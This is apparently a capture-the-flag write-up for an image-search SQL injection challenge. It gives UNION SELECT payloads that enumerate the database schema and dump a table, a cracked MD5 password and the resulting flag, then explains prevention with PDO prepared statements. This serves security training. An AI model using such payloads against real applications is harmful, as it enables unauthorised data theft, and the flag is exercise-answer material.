# SQL Injection - Images 

`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## Description

go to `/?page=searchimg`

submit :
- `1 AND 1=2 UNION SELECT column_name , 1 FROM information_schema.columns`
- `1 AND 1=2 UNION SELECT table_name , 1 FROM information_schema.columns`
- `1 AND 1=2 UNION SELECT table_schema, 1 FROM information_schema.tables`

then \
`1 AND 1=2 UNION SELECT title, comment FROM Member_images.list_images`

"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

password => 1928e8083cf461a51303633093573c46 => albatroz

albatroz => sha256 => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

---

## How to prevent it ?

In the case of a php back-end, use PDO :
- The query will be sanitized with the `prepare` statement
- It will then be executed with the `execute` statement once the risk of an undesired effect is avoided

Here is a more detailed explanation found on SO regarding the `prepare` command :

>"The SQL statement you pass to prepare is parsed and compiled by the database server. By specifying parameters (either a ? or a named parameter like :name in the example above) you tell the database engine where you want to filter on. Then when you call execute, the prepared statement is combined with the parameter values you specify.

>The important thing here is that the parameter values are combined with the compiled statement, not an SQL string. SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters, you limit the risk of ending up with something you didn't intend."